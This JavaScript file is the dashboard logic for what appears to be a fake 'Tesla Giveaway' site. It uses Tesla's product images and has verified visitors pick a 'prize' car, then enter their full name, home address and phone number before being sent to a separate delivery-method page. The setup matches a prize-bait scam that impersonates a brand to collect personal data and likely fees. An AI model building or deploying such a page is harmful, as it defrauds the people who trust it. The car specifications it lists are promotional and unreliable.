// Tesla Giveaway — Dashboard Logic

const cars = [
  { id:'model3',  name:'Model 3',    color:'Pearl White',      price:'$38,990',  emoji:'🚗',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png',
    specs:['3.1s 0–60','333mi Range','AWD Dual Motor','5★ Safety'], badge:'Most Popular' },
  { id:'modely',  name:'Model Y',    color:'Midnight Silver',  price:'$44,990',  emoji:'🚙',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png',
    specs:['3.5s 0–60','330mi Range','76 cu ft Cargo','7 Seats'], badge:'Best Seller' },
  { id:'models',  name:'Model S',    color:'Ultra Red',        price:'$74,990',  emoji:'🏎️',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png',
    specs:['1.99s 0–60','396mi Range','1,020 hp Plaid','200mph Top'], badge:'Ludicrous' },
  { id:'modelx',  name:'Model X',    color:'Deep Blue',        price:'$79,990',  emoji:'🚐',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png',
    specs:['2.5s 0–60','333mi Range','Falcon Wing Doors','7 Seats'], badge:'Iconic' },
  { id:'cybertruck', name:'Cybertruck', color:'Stainless Steel', price:'$60,990', emoji:'🛻',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png',
    specs:['2.6s 0–60','340mi Range','11,000lb Towing','Exo-skeleton'], badge:'Tough' },
  { id:'roadster', name:'Roadster',  color:'Signature Red',    price:'$200,000', emoji:'🏎️',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png',
    specs:['1.1s 0–60','620mi Range','250+ mph Top','4 Seats'], badge:'Ultimate' },
];

let selectedCar = null;

// ── INIT ─────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async () => {
  // Persist session from email-verify redirect
  const urlSession = new URLSearchParams(window.location.search).get('session');
  if (urlSession) {
    saveSession(urlSession);
    history.replaceState(null, '', '/dashboard.html');
  }

  const session = getSession();
  if (!session) { window.location.href = '/entry.html'; return; }

  try {
    const data = await apiCall(`/session?token=${session}`);
    if (!data.valid) { clearSession(); window.location.href = '/entry.html'; return; }

    // Show verified banner (only when coming from email link)
    if (urlSession) {
      const banner = document.getElementById('verifiedBanner');
      if (banner) {
        banner.style.display = 'flex';
        document.getElementById('userNameDisplay').textContent =
          data.user.firstName ? data.user.firstName : data.user.email.split('@')[0];
      }
    }

    window._userData = data.user;

    // Pre-fill name in delivery form
    const nameInput = document.querySelector('[name="fullName"]');
    if (nameInput && data.user.firstName) {
      nameInput.value = `${data.user.firstName} ${data.user.lastName || ''}`.trim();
    }
    const phoneInput = document.querySelector('[name="deliveryPhone"]');
    if (phoneInput && data.user.phone) phoneInput.value = data.user.phone;

  } catch (err) { clearSession(); window.location.href = '/entry.html'; return; }

  // Recover selectedCar from sessionStorage if not in localStorage
  if (!localStorage.getItem('tesla_selected_car')) {
    var backup = sessionStorage.getItem('tesla_selected_car');
    if (backup) {
      try {
        localStorage.setItem('tesla_selected_car', backup);
      } catch(_) {}
    }
  }

  renderCars();
});

// ── CAR GRID ──────────────────────────────────────────────────────────
function renderCars() {
  const grid = document.getElementById('carGrid');
  if (!grid) return;
  grid.innerHTML = cars.map(car => `
    <div class="car-card" onclick="selectCar('${car.id}')" id="card-${car.id}">
      <div class="sel-check">✓</div>
      <div class="car-img-area">
        <img src="${car.img}" alt="Tesla ${car.name}"
          onerror="this.style.display='none';this.parentNode.insertAdjacentHTML('beforeend','<div style=font-size:52px>${car.emoji}</div>')">
      </div>
      <div class="car-body">
        <div class="car-badge">${car.badge}</div>
        <div class="car-title">Tesla ${car.name}</div>
        <div class="car-meta">${car.color} · ${car.price}</div>
        <div class="car-specs">
          ${car.specs.map(s => `<span class="car-spec-pill">${s}</span>`).join('')}
        </div>
      </div>
    </div>
  `).join('');
}

function selectCar(carId) {
  document.querySelectorAll('.car-card').forEach(el => el.classList.remove('selected'));
  const card = document.getElementById(`card-${carId}`);
  if (card) { card.classList.add('selected'); card.scrollIntoView({ behavior:'smooth', block:'nearest' }); }
  selectedCar = cars.find(c => c.id === carId);
  const btn = document.getElementById('confirmCarBtn');
  if (btn) { btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer'; }
}

function confirmCar() {
  if (!selectedCar) return;
  // Update step bar
  setStep(3);
  document.getElementById('stepSelectCar').style.display = 'none';
  const deliveryStep = document.getElementById('stepDelivery');
  deliveryStep.style.display = 'block';
  deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
  // Update selected car summary
  document.getElementById('selectedCarTitle').textContent = `Tesla ${selectedCar.name}`;
  document.getElementById('selectedCarColor').textContent = selectedCar.color;
  document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
}

function goBackToCars() {
  setStep(2);
  document.getElementById('stepDelivery').style.display = 'none';
  document.getElementById('stepSelectCar').style.display = 'block';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── STEP INDICATOR ────────────────────────────────────────────────────
function setStep(n) {
  const circles = [null, 'sc1','sc2','sc3','sc4'];
  const lineIds = [null, null,'sl1','sl2','sl3'];
  const labelIds = [null, null,'sl2t','sl3t','sl4t'];

  for (let i = 2; i <= 4; i++) {
    const c = document.getElementById(circles[i]);
    const l = document.getElementById(lineIds[i]);
    const lt = document.getElementById(labelIds[i]);
    if (!c) continue;
    if (i < n) {
      c.className = 's-circle done'; c.textContent = '✓';
      if (l) l.className = 's-line done';
      if (lt) lt.className = 's-label done';
    } else if (i === n) {
      c.className = 's-circle active'; c.textContent = i;
      if (l) l.className = 's-line';
      if (lt) lt.className = 's-label active';
    } else {
      c.className = 's-circle'; c.textContent = i;
      if (l) l.className = 's-line';
      if (lt) lt.className = 's-label';
    }
  }
}

// ── DELIVERY FORM ─────────────────────────────────────────────────────
document.addEventListener('submit', async (e) => {
  if (e.target.id !== 'deliveryForm') return;
  e.preventDefault();
  const form = e.target;

  const deliveryDetails = {
    fullName:      form.fullName.value.trim(),
    address:       form.address.value.trim(),
    city:          form.city.value.trim(),
    state:         form.state.value.trim(),
    zipCode:       form.zipCode.value.trim(),
    country:       form.country.value.trim(),
    phone:         form.deliveryPhone.value.trim(),
    instructions:  form.instructions.value.trim(),
  };

  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city ||
      !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
    showToast('Please fill in all required fields.', 'error');
    return;
  }

  // Save to localStorage and proceed to delivery method page
  // Save to both localStorage and sessionStorage for reliability
  var carData = JSON.stringify(selectedCar);
  var deliveryData = JSON.stringify(deliveryDetails);
  localStorage.setItem('tesla_selected_car', carData);
  localStorage.setItem('tesla_delivery_details', deliveryData);
  sessionStorage.setItem('tesla_selected_car', carData);
  sessionStorage.setItem('tesla_delivery_details', deliveryData);
  localStorage.setItem('tesla_session_token', getSession());

  window.location.href = '/delivery-method.html';
});

function logout() {
  clearSession();
  localStorage.removeItem('tesla_selected_car');
  localStorage.removeItem('tesla_delivery_details');
  localStorage.removeItem('tesla_delivery_method');
  window.location.href = '/';
}
